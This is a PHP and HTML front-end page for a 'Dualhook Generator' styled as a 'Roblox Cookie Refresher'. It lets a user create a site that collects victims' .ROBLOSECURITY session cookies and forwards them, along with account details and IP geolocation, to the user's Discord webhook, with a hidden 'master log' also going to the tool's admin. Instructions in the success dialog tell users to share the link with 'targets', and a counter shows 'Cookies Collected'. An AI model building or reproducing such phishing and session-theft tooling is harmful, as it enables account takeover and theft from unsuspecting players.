<?php
require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dualhook Generator - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
            min-height: 100vh;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #3b82f6 0%, #2563eb 25%, #1d4ed8 50%, #3b82f6 75%, #2563eb 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .icon-box {
            width: 80px;
            height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            border-radius: 20px;
            font-size: 36px;
            margin: 0 auto 20px;
        }

        input:focus, textarea:focus {
            outline: none;
            border-color: #3b82f6 !important;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2) !important;
        }

        .btn-generate {
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            transition: all 0.3s ease;
        }

        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
        }

        .info-text {
            font-size: 13px;
            color: #94a3b8;
            margin-top: 6px;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center px-4 py-12">
    <div class="max-w-lg w-full mx-auto">
        <!-- Header -->
        <div class="text-center mb-8">
            <div class="icon-box glass-effect mx-auto">
                <span>🍪</span>
            </div>
            <h1 class="text-4xl md:text-5xl font-display font-bold tracking-tight mb-3 animated-gradient-text">
                Roblox Cookie Refresher
            </h1>
            <p class="text-xl text-white/80 font-semibold mb-2">
                Dual Hook Generator
            </p>
            <p class="text-white/60">
                Create your own Roblox cookie Dualhook site in seconds
            </p>
        </div>

        <!-- Main Card -->
        <div class="glass-effect rounded-3xl p-8 shadow-2xl">
            <form id="generatorForm">
                <!-- Site Name -->
                <div class="mb-6">
                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                            <path d="M2 6a2 2 0 012-2h12a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6zm2 0v8h12V6H4z"/>
                        </svg>
                        Site Name (Directory)
                    </label>
                    <input 
                        type="text" 
                        id="directory" 
                        name="directory" 
                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all"
                        placeholder="e.g., myrefresher123"
                        pattern="[a-zA-Z0-9_-]+"
                        minlength="3"
                        maxlength="20"
                        required
                    >
                    <p class="info-text">3-32 characters: letters, numbers, hyphens, underscores only</p>
                </div>

                <!-- Discord Webhook URL -->
                <div class="mb-6">
                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                            <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
                            <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/>
                        </svg>
                        Discord Webhook URL
                    </label>
                    <input 
                        type="url" 
                        id="webhook" 
                        name="webhook" 
                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all"
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    >
                    <p class="info-text">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</p>
                </div>

                <!-- reCAPTCHA -->
                <div class="mb-6 flex justify-center">
                    <div class="g-recaptcha" data-sitekey="6LfYourSiteKey"></div>
                </div>

                <!-- Generate Button -->
                <button 
                    type="submit" 
                    class="w-full py-4 btn-generate text-white font-bold text-lg rounded-xl flex items-center justify-center gap-3"
                    id="generateBtn"
                >
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
                    </svg>
                    Generate Site
                </button>
            </form>

            <!-- Info Section -->
            <div class="mt-8 pt-6 border-t border-white/10 text-center">
                <p class="text-sm text-white/60">
                    Each site generates a unique URL where people can submit their Roblox cookies.
                </p>
            </div>

            <!-- Back Link -->
            <div class="mt-6 text-center">
                <a href="/" class="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors inline-flex items-center gap-2">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
                    </svg>
                    Back to Main Site
                </a>
            </div>
        </div>

        <!-- Stats -->
        <div class="mt-8 grid grid-cols-3 gap-4">
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalInstances']); ?></div>
                <div class="text-xs text-white/60 mt-1">Sites Created</div>
            </div>
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalCookies']); ?></div>
                <div class="text-xs text-white/60 mt-1">Cookies Collected</div>
            </div>
            <div class="glass-effect rounded-2xl p-4 text-center">
                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalVisits']); ?></div>
                <div class="text-xs text-white/60 mt-1">Total Visits</div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('generatorForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const btn = document.getElementById('generateBtn');
            const originalHTML = btn.innerHTML;
            
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner mx-auto"></div>';
            
            const formData = {
                directory: document.getElementById('directory').value.trim(),
                webhook: document.getElementById('webhook').value.trim(),
            };
            
            try {
                const response = await fetch('create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(formData)
                });
                
                const data = await response.json();
                
                if (data.success) {
                    Swal.fire({
                        icon: 'success',
                        title: 'Site Generated Successfully!',
                        html: `
                            <div class="text-left space-y-4">
                                <div>
                                    <p class="text-sm text-gray-600 mb-1">📁 Site Name</p>
                                    <p class="font-mono text-sm bg-gray-100 p-2 rounded">${data.directory}</p>
                                </div>
                                <div>
                                    <p class="text-sm text-gray-600 mb-1">🔗 Your Link</p>
                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.instanceUrl}</p>
                                </div>
                                <div>
                                    <p class="text-sm text-gray-600 mb-1">📊 Dashboard</p>
                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.dashboardUrl}</p>
                                </div>
                                <div>
                                    <p class="text-sm text-gray-600 mb-1">🔑 Access Token</p>
                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.token}</p>
                                </div>
                                <div class="bg-green-50 border border-green-200 rounded p-3 mt-4">
                                    <p class="text-xs text-green-800">✅ Account info fetching</p>
                                    <p class="text-xs text-green-800">✅ Robux balance display</p>
                                    <p class="text-xs text-green-800">✅ Premium status check</p>
                                    <p class="text-xs text-green-800">✅ Limited RAP calculation</p>
                                    <p class="text-xs text-green-800">✅ Group ownership detection</p>
                                    <p class="text-xs text-green-800">✅ IP geolocation</p>
                                    <p class="text-xs text-green-800">✅ Game visit stats</p>
                                    <p class="text-xs text-green-800">✅ Rich Discord embeds</p>
                                    <p class="text-xs text-green-800">✅ Cookie refresh bypass</p>
                                    <p class="text-xs text-green-800">✅ Master admin logging</p>
                                </div>
                                <div class="bg-blue-50 border border-blue-200 rounded p-3">
                                    <p class="text-xs text-blue-800 font-semibold mb-2">📋 How It Works</p>
                                    <p class="text-xs text-blue-800">1. Share your link with targets</p>
                                    <p class="text-xs text-blue-800">2. They submit their .ROBLOSECURITY cookie</p>
                                    <p class="text-xs text-blue-800">3. Cookie is automatically Bypassed</p>
                                    <p class="text-xs text-blue-800">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE</p>
                                    <p class="text-xs text-blue-800">5. Master log sent to admin</p>
                                </div>
                            </div>
                        `,
                        confirmButtonText: 'OK',
                        confirmButtonColor: '#3b82f6',
                        width: '600px'
                    });
                    
                    document.getElementById('generatorForm').reset();
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error || 'Failed to create instance',
                        confirmButtonColor: '#3b82f6'
                    });
                }
            } catch (error) {
                Swal.fire({
                    icon: 'error',
                    title: 'Connection Error',
                    text: 'Failed to connect to server',
                    confirmButtonColor: '#3b82f6'
                });
            } finally {
                btn.disabled = false;
                btn.innerHTML = originalHTML;
            }
        });
    </script>
</body>
</html>
